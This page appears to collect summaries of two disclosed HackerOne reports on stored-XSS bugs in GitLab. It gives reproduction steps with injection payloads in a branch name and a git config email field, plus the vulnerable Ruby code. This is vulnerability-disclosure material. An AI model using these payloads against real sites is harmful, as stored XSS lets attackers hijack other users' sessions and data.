# Store



* [**GitLab**](https://hackerone.com/gitlab) disclosed a bug submitted by [**yvvdwf**](https://hackerone.com/yvvdwf)  [Stored-XSS in merge requests](https://hackerone.com/reports/977697)13 Jul 2021 

> 1. Create a new project and check option "Initialize repository with a README"
> 2. Create a new branch with name `'> <iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>`
> 3. `Push and merge this request from the new branch to master`
> 4. `bingo!`

## 

* [**GitLab**](https://hackerone.com/gitlab) disclosed a bug submitted by [**yvvdwf**](https://hackerone.com/yvvdwf)  [Stored-XSS on wiki pages](https://hackerone.com/reports/1087061)13 Jul 2021 

> \`author_url\` in  show.html.haml\#L10 not been sanitized._
>
> 1. _Clone wiki reponsitory of an existing project or a new one._
> 2. _Go to inside \`test.wiki\` directory and add the following lines at the end of .git.config file_
> 3. _Moddify/create any wiki page and push it into gitlab server_
> 4. _open the wiki, bingo._
>
> ```text
> Wrap lines Copy Download
> [user]
> 	name = anyname
> 	email = "#' style=animation-name:blinking-dot onanimationstart=alert(document.domain) other"
> ```

the \`wiki_page_versoin.rb\` :

```ruby
    delegate :message, :sha, :id, :author_name, :author_email, :authored_date, to: :commit

      def author_url
        user = ::User.find_by_any_email(author_email)
        user.nil? ? "mailto:#{author_email}" : Gitlab::UrlBuilder.build(user)
      end
```

